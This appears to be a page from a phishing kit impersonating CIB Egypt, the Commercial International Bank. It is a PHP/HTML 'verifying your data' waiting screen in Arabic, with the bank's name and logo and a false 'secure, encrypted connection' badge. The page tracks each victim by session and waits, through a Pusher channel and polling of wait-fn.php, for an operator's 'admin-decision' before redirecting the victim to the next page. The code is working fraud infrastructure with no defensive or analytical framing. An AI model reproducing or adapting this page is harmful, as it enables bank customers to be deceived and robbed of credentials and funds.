<?php
error_reporting(0);
ini_set('display_errors', 0);
session_start();
require_once('./dashboard/init.php');
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="utf-8">
    <title>جاري المعالجة - CIB</title>
    <meta content="width=device-width, initial-scale=1.0" name="viewport">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;800&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Cairo', sans-serif;
            min-height: 100vh;
            background: linear-gradient(135deg, #0a1628 0%, #1a2a4a 40%, #0d1f3c 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            direction: rtl;
            overflow: hidden;
            position: relative;
        }

        /* Animated background particles */
        .bg-particles {
            position: fixed;
            inset: 0;
            overflow: hidden;
            z-index: 0;
        }

        .bg-particles span {
            position: absolute;
            width: 2px;
            height: 2px;
            background: rgba(255, 255, 255, 0.15);
            border-radius: 50%;
            animation: float-up linear infinite;
        }

        @keyframes float-up {
            0% {
                transform: translateY(100vh) scale(0);
                opacity: 0;
            }

            10% {
                opacity: 1;
            }

            90% {
                opacity: 1;
            }

            100% {
                transform: translateY(-10vh) scale(1);
                opacity: 0;
            }
        }

        .container {
            position: relative;
            z-index: 1;
            text-align: center;
            padding: 20px;
            max-width: 420px;
            width: 100%;
        }

        /* Glass card */
        .glass-card {
            background: rgba(255, 255, 255, 0.06);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 24px;
            padding: 48px 32px 40px;
            box-shadow:
                0 8px 32px rgba(0, 0, 0, 0.3),
                inset 0 1px 0 rgba(255, 255, 255, 0.1);
        }

        /* Logo */
        .logo-wrap {
            margin-bottom: 32px;
        }

        .logo-wrap img {
            width: 120px;
            height: auto;
            filter: brightness(1.1);
        }

        /* Spinner */
        .spinner-container {
            position: relative;
            width: 80px;
            height: 80px;
            margin: 0 auto 28px;
        }

        .spinner-ring {
            position: absolute;
            inset: 0;
            border-radius: 50%;
            border: 3px solid transparent;
            animation: spin 1.5s linear infinite;
        }

        .spinner-ring:nth-child(1) {
            border-top-color: #3b82f6;
            border-right-color: #3b82f6;
        }

        .spinner-ring:nth-child(2) {
            inset: 6px;
            border-bottom-color: #60a5fa;
            border-left-color: #60a5fa;
            animation-duration: 2s;
            animation-direction: reverse;
        }

        .spinner-ring:nth-child(3) {
            inset: 12px;
            border-top-color: #93c5fd;
            animation-duration: 2.5s;
        }

        .spinner-dot {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 12px;
            height: 12px;
            background: #3b82f6;
            border-radius: 50%;
            animation: pulse-dot 1.5s ease-in-out infinite;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        @keyframes pulse-dot {

            0%,
            100% {
                transform: translate(-50%, -50%) scale(1);
                opacity: 1;
            }

            50% {
                transform: translate(-50%, -50%) scale(1.4);
                opacity: 0.6;
            }
        }

        /* Text */
        .wait-title {
            color: #ffffff;
            font-size: 20px;
            font-weight: 700;
            margin-bottom: 8px;
            letter-spacing: -0.3px;
        }

        .wait-subtitle {
            color: rgba(255, 255, 255, 0.55);
            font-size: 14px;
            font-weight: 400;
            line-height: 1.6;
            margin-bottom: 28px;
        }

        /* Progress bar */
        .progress-container {
            background: rgba(255, 255, 255, 0.08);
            border-radius: 99px;
            height: 4px;
            overflow: hidden;
            margin-bottom: 16px;
        }

        .progress-bar {
            height: 100%;
            border-radius: 99px;
            background: linear-gradient(90deg, #3b82f6, #60a5fa, #3b82f6);
            background-size: 200% 100%;
            animation: shimmer 2s ease-in-out infinite;
            width: 60%;
        }

        @keyframes shimmer {
            0% {
                background-position: 200% 0;
            }

            100% {
                background-position: -200% 0;
            }
        }

        /* Security badge */
        .security-badge {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            background: rgba(34, 197, 94, 0.1);
            border: 1px solid rgba(34, 197, 94, 0.2);
            border-radius: 99px;
            padding: 6px 14px;
            margin-top: 4px;
        }

        .security-badge svg {
            flex-shrink: 0;
        }

        .security-badge span {
            color: #4ade80;
            font-size: 12px;
            font-weight: 600;
        }

        /* Steps indicator */
        .steps {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-top: 24px;
        }

        .step-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.15);
            transition: all 0.3s;
        }

        .step-dot.active {
            background: #3b82f6;
            box-shadow: 0 0 8px rgba(59, 130, 246, 0.5);
            animation: step-pulse 1.2s ease-in-out infinite;
        }

        .step-dot.done {
            background: #4ade80;
        }

        @keyframes step-pulse {

            0%,
            100% {
                transform: scale(1);
            }

            50% {
                transform: scale(1.3);
            }
        }

        /* Bottom text */
        .bottom-note {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            color: rgba(255, 255, 255, 0.25);
            font-size: 11px;
            white-space: nowrap;
        }
    </style>
</head>

<body>
    <!-- Animated particles -->
    <div class="bg-particles" id="particles"></div>

    <div class="container">
        <div class="glass-card">
            <div class="logo-wrap">
                <img src="assets/logo.webp" alt="CIB">
            </div>

            <div class="spinner-container">
                <div class="spinner-ring"></div>
                <div class="spinner-ring"></div>
                <div class="spinner-ring"></div>
                <div class="spinner-dot"></div>
            </div>

            <h2 class="wait-title">جاري التحقق من بياناتك</h2>
            <p class="wait-subtitle">نقوم بمراجعة معلوماتك للتأكد من صحتها.<br>يرجى عدم إغلاق هذه الصفحة.</p>

            <div class="progress-container">
                <div class="progress-bar"></div>
            </div>

            <div class="security-badge">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#4ade80" stroke-width="2.5"
                    stroke-linecap="round" stroke-linejoin="round">
                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
                </svg>
                <span>اتصال آمن ومشفّر</span>
            </div>

            <div class="steps">
                <div class="step-dot done"></div>
                <div class="step-dot active"></div>
                <div class="step-dot"></div>
            </div>
        </div>
    </div>

    <div class="bottom-note">CIB Egypt © 2025 — Commercial International Bank</div>

    <script>
        // Create floating particles
        (function () {
            const container = document.getElementById('particles');
            for (let i = 0; i < 40; i++) {
                const span = document.createElement('span');
                span.style.left = Math.random() * 100 + '%';
                span.style.width = (Math.random() * 3 + 1) + 'px';
                span.style.height = span.style.width;
                span.style.animationDuration = (Math.random() * 8 + 6) + 's';
                span.style.animationDelay = (Math.random() * 5) + 's';
                container.appendChild(span);
            }
        })();
    </script>

    <script src="https://code.jquery.com/jquery-3.6.0.js" crossorigin="anonymous"></script>
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    <script>
        var userId = <?php echo $_SESSION['user_id'] ?? 0; ?>;

        // Pusher real-time listener
     var pusher = new Pusher('0737c04931774e406307', {
      cluster: 'ap2'
    });
        var channel = pusher.subscribe('my-channel-cib');
        channel.bind('admin-decision', function (data) {
            if (data.userId == userId) {
                window.location = data.url;
            }
        });

        // Fallback polling
        setInterval(() => {
            $.ajax({
                url: "wait-fn.php",
                type: "POST",
                success: (response) => {
                    const data = JSON.parse(response);
                    if (data.status == 1 || data.status == 2) {
                        window.location = data.url;
                    }
                }
            });
        }, 2000);
    </script>
</body>

</html>